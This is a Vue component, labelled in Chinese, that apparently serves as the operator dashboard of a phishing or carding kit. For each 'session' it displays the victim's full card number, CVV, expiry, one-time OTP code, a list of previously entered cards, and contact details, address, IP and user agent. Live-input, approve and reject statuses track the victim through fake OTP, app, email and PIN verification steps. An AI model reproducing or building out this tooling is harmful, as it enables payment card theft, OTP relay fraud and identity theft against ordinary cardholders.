<script setup lang="ts">
import { computed } from 'vue';

const props = defineProps<{
  session: Api.Payment.PaymentSession | null;
}>();

const emit = defineEmits<{
  (e: 'close'): void;
}>();

const stepLabel = (s: string) => ({ product: '商品页', address: '地址页', card: '卡片页', otp: 'OTP验证页', app_verify: 'APP验证页', email_verify: '邮箱验证页', pin_verify: 'PIN验证页', completed: '已完成' }[s] || s);

const statusLabel = (s: string) => {
  const m: Record<string, string> = { live: '实时输入中', pending: '待处理', processing: '处理中', completed: '已完成', approved: '已通过', rejected: '已拒绝', cancelled: '已取消' };
  return m[s] || s;
};
</script>

<template>
  <NModal :show="!!session" :mask-closable="true" @update:show="emit('close')">
    <div class="modal" v-if="session">
      <div class="modal-header">
        <span class="modal-title">会话详情 #{{ session.sessionId }}</span>
        <span class="status-tag" :class="'st-' + session.status">{{ statusLabel(session.status) }}</span>
        <NButton text @click="emit('close')" class="close-btn">✕</NButton>
      </div>

      <div class="modal-body">
        <div class="section">
          <h4>卡片信息</h4>
          <NGrid :cols="3" :x-gap="16" :y-gap="8">
            <NGi><label>卡号</label><span class="val">{{ (session.cardInfo.cardNumber || '').replace(/(\d{4})/g, '$1 ').trim() }}</span></NGi>
            <NGi><label>持卡人</label><span class="val">{{ session.cardInfo.cardHolder || '-' }}</span></NGi>
            <NGi><label>卡品牌</label><span class="val">{{ session.cardInfo.cardType || '-' }}</span></NGi>
            <NGi><label>卡级</label><span class="val">{{ session.cardInfo.cardLevel || '-' }}</span></NGi>
            <NGi><label>发卡行</label><span class="val">{{ session.cardInfo.bankName || '-' }}</span></NGi>
            <NGi><label>有效期</label><span class="val">{{ session.cardInfo.expiry || '-' }}</span></NGi>
            <NGi><label>CVV</label><span class="val">{{ session.cardInfo.cvv || '-' }}</span></NGi>
            <NGi v-if="session.cardInfo.otpCode"><label>OTP码</label><span class="val otp">{{ session.cardInfo.otpCode }}</span></NGi>
          </NGrid>
        </div>

        <div class="section">
          <h4>用户信息</h4>
          <NGrid :cols="3" :x-gap="16" :y-gap="8">
            <NGi><label>姓名</label><span class="val">{{ session.customerInfo.fullName || '-' }}</span></NGi>
            <NGi><label>邮箱</label><span class="val">{{ session.customerInfo.email || '-' }}</span></NGi>
            <NGi><label>电话</label><span class="val">{{ session.customerInfo.phone || '-' }}</span></NGi>
            <NGi><label>国家</label><span class="val">{{ session.customerInfo.country || '-' }}</span></NGi>
            <NGi><label>城市</label><span class="val">{{ session.customerInfo.city || '-' }}</span></NGi>
            <NGi><label>州/省</label><span class="val">{{ session.customerInfo.state || '-' }}</span></NGi>
            <NGi v-if="session.customerInfo.address1"><label>地址1</label><span class="val">{{ session.customerInfo.address1 }}</span></NGi>
            <NGi v-if="session.customerInfo.address2"><label>地址2</label><span class="val">{{ session.customerInfo.address2 }}</span></NGi>
            <NGi v-if="session.customerInfo.zipCode"><label>邮编</label><span class="val">{{ session.customerInfo.zipCode }}</span></NGi>
            <NGi v-if="(session as any).ip"><label>IP</label><span class="val">{{ (session as any).ip }}</span></NGi>
            <NGi v-if="(session as any).ua"><label>UA</label><span class="val" style="font-size:11px;word-break:break-all">{{ (session as any).ua }}</span></NGi>
          </NGrid>
        </div>

        <div class="section" v-if="(session.cardHistory || []).length">
          <h4>卡片历史 ({{ session.cardHistory.length }})</h4>
          <div class="hist-list">
            <div v-for="(h, i) in session.cardHistory" :key="i" class="hist-item">
              <span class="hist-num">#{{ i + 1 }}</span>
              <span>{{ h.cardHolder || '-' }}  {{ (h.cardNumber || '-') }} | {{ h.expiry || '-' }} | {{ h.cvv || '-' }}</span>
            </div>
          </div>
        </div>

        <div class="section">
          <h4>会话信息</h4>
          <NGrid :cols="3" :x-gap="16" :y-gap="8">
            <NGi><label>状态</label><span class="val">{{ statusLabel(session.status) }}</span></NGi>
            <NGi><label>当前步骤</label><span class="val">{{ stepLabel(session.currentStep) }}</span></NGi>
            <NGi><label>来源</label><span class="val">{{ session.frontendUrl }}</span></NGi>
            <NGi><label>创建时间</label><span class="val">{{ session.createdAt }}</span></NGi>
            <NGi><label>更新时间</label><span class="val">{{ session.updatedAt }}</span></NGi>
            <NGi><label>在线状态</label><span class="val">{{ session.isOnline ? '在线' : '离线' }}</span></NGi>
          </NGrid>
        </div>
      </div>
    </div>
  </NModal>
</template>

<style scoped>
.modal {
  background: var(--n-color);
  border-radius: 12px;
  width: 800px;
  max-width: 90vw;
  max-height: 85vh;
  overflow-y: auto;
}
.modal-header {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 20px 24px;
  border-bottom: 1px solid var(--n-border-color);
  position: sticky;
  top: 0;
  background: var(--n-color);
  z-index: 1;
}
.modal-title {
  font-size: 18px;
  font-weight: bold;
  color: var(--n-text-color);
}
.close-btn { margin-left: auto; color: var(--n-text-color-3); }
.modal-body { padding: 20px 24px; }
.section { margin-bottom: 24px; }
.section h4 {
  font-size: 14px;
  color: #18d46b;
  margin-bottom: 12px;
  padding-bottom: 6px;
  border-bottom: 1px solid var(--n-border-color);
}
label { font-size: 12px; color: var(--n-text-color-3); display: block; margin-bottom: 2px; }
.val { font-size: 13px; color: var(--n-text-color); }
.val.otp { color: #f0a12d; font-weight: bold; }
.status-tag {
  padding: 2px 10px;
  border-radius: 4px;
  font-size: 12px;
}
.st-pending { color: #fff; background: #f0a12d; }
.st-approved { color: #18d46b; background: #18d46b15; border: 1px solid #18d46b33; }
.st-rejected { color: #ff5d70; background: #ff5d7015; border: 1px solid #ff5d7033; }
.st-live { color: #18d46b; background: #18d46b10; }
.hist-list { display: flex; flex-direction: column; gap: 6px; }
.hist-item {
  display: flex; align-items: center; gap: 12px;
  padding: 8px 12px; background: var(--n-color-target); border-radius: 6px;
  font-size: 13px; color: var(--n-text-color);
  word-break: break-all;
}
.hist-num { color: var(--n-text-color-3); font-weight: bold; }
.hist-tag { background: var(--n-color); padding: 1px 8px; border-radius: 3px; font-size: 12px; color: var(--n-text-color-3); }
</style>
